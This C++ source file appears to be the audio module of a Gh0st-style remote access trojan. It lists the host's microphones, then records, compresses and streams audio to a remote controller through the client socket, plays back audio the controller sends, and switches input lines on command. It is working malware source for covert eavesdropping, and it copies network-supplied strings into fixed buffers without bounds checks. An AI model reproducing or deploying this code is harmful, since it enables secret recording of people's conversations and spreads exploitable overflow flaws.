// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#include "AudioManager.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{
	m_bIsWorking = false;
	m_lpAudio = NULL;
	// 初始化
	if (!Initialize())
		return;

	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
}

CAudioManager::~CAudioManager()
{
	StopListen();
}

void CAudioManager::StopListen()
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	
	if (m_lpAudio)
		delete	m_lpAudio;
}

bool CAudioManager::Initialize()
{
	UINT nDevNum  = waveInGetNumDevs();
	if (nDevNum == 0)
		return false;
	
	m_lpAudio = new CAudio;
	if(m_lpAudio == NULL)
		return false;

	WAVE_INFO Wave_Info;
	ZeroMemory(&Wave_Info,sizeof(WAVE_INFO));

	for(UINT i = 0; i < nDevNum ; i++)
	{
		WAVEINCAPS tagCaps;
		waveInGetDevCaps(i,&tagCaps,sizeof(tagCaps));
		strcat(Wave_Info.str,tagCaps.szPname);
		strcat(Wave_Info.str,"$");
		
		if (i == 0)
		{
			// 根据 输入设备名  枚举输入线路  参数 设备名 字符串
			int nRet = m_lpAudio->EnumerateInputLines(tagCaps.szPname,Wave_Info.str);
			if (nRet == -1)
			{
				Wave_Info.nIndex = 0;
				strcat(Wave_Info.str,"N/A@");
			}
			else
				Wave_Info.nIndex = nRet;

			strcat(Wave_Info.str,"|");
		}
	}

	// 正在使用中.. 防止重复使用
	if (m_bIsWorking)
		return false;

	sendWaveInfo(&Wave_Info,TOKEN_AUDIO_START);

	return true;
}

BOOL CAudioManager::sendWaveInfo(WAVE_INFO * Wave_Info , BYTE bToken)
{
	DWORD	dwBytesLength = 1 + sizeof(WAVE_INFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return FALSE;
	
	lpBuffer[0] = bToken;
	
	memcpy(lpBuffer + 1,Wave_Info,sizeof(WAVE_INFO));
	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;	

	return TRUE;
}

int CAudioManager::sendRecordBuffer()
{
	DWORD	dwBytes = 0;
	int	nSendBytes = 0;
	
	LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
	if (lpBuffer == NULL)
		return 0;

	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
	lpPacket[0] = TOKEN_AUDIO_DATA;

	if (dwBytes > 0)
	{
		memset(m_cBufln,0,SIZE_AUDIO_PACKED);
		int lin  = m_lpAudio->Compress((char*)lpBuffer,m_cBufln,dwBytes);
		memcpy(lpPacket + 1, m_cBufln, lin);

		nSendBytes = Send(lpPacket, lin + 1);
	}

	delete [] lpPacket;
	
	return nSendBytes;
}

void CAudioManager::OnReceive( LPBYTE lpBuffer, UINT nSize )
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}

	if (lpBuffer[0] == COMMAND_AUDIO_CHANGER)
	{
		StopListen();

		m_lpAudio = new CAudio;
		if (m_lpAudio == NULL)
			return;

		WAVE_INFO Wave_Info;
    	memcpy(&Wave_Info, lpBuffer +1 , sizeof(WAVE_INFO));

		m_lpAudio->m_SelectedDevice = Wave_Info.nIndex;

		char str[MAX_PATH] = {0};
		lstrcpy(str,Wave_Info.str);

		ZeroMemory(&Wave_Info,sizeof(WAVE_INFO));

		int nRet = Wave_Info.nIndex = m_lpAudio->EnumerateInputLines(str,Wave_Info.str);
		if (nRet == -1)
		{
			Wave_Info.nIndex = 0;
			strcpy(Wave_Info.str,"N/A@");
		}
		else
			Wave_Info.nIndex = nRet;
		
		sendWaveInfo(&Wave_Info,TOKEN_AUDIO_CHANGE_FINISH);

		m_hWorkThread = MyCreateThread(NULL,
			0, 
			(LPTHREAD_START_ROUTINE)WorkThread, 
			(LPVOID)this,
			0, 
			NULL
			);

		return;
	}

	if (lpBuffer[0] ==COMMAND_AUDIO_DATE )
	{
		memset(m_cBufOut,0,SIZE_AUDIO_FRAME);
		int lOut = m_lpAudio->DeCompress((char *)lpBuffer + 1,m_cBufOut,nSize - 1);
    	m_lpAudio->playBuffer((LPBYTE)m_cBufOut, lOut);
	}

	if (lpBuffer[0] == COMMAND_AUDIO_CHANGER_LINES)
	{
		WAVE_INFO Wave_Info;
		memcpy(&Wave_Info, lpBuffer +1 , sizeof(WAVE_INFO));
		m_lpAudio->ActiveMixerInputChannel(Wave_Info.str,Wave_Info.nIndex);
	}
}

DWORD WINAPI CAudioManager::WorkThread( LPVOID lparam )
{
	CAudioManager *pThis = (CAudioManager *)lparam;

	pThis->m_bIsWorking = true;
	// 等待远程对话框打开,init
	pThis->WaitForDialogOpen();

	while (pThis->m_bIsWorking)
		pThis->sendRecordBuffer();
	
	return -1;
}
